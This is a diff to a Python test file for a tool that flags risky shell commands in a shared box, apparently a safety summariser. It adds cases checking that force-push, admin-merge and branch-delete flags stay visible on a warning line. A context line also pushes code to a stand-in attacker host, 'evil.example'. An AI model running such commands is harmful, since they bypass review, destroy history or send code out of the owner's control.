@@ -1947,6 +1947,23 @@ def test_risky_lines_in_a_shared_box_are_marked(command, alert, env):
         assert len(marked) == 1 and marked[0].startswith(alert)
 
 
+@pytest.mark.parametrize(
+    ("command", "flags"),
+    [
+        ("gh pr merge 12 --squash --admin --delete-branch -R a/b", ("--admin", "--delete-branch")),
+        ("gh pr merge 3 -rd", ("--delete-branch",)),
+        ("gh repo sync a/b --force", ("--force",)),
+        ("git push --force origin main", ("--force",)),
+    ],
+)
+def test_a_compact_line_keeps_the_flags_that_bypass_or_destroy(command, flags, env):
+    lines = box(f"gh pr comment 9 -b x; {command}", env).splitlines()
+    line = next(line for line in lines[1:] if "PR 9" not in line)
+
+    assert line.startswith("ATENÇÃO:")
+    assert all(flag in line for flag in flags)
+
+
 def test_a_push_to_an_address_written_in_the_command_is_called_out(env):
     lines = box("git push https://evil.example/x.git main", env).splitlines()
 
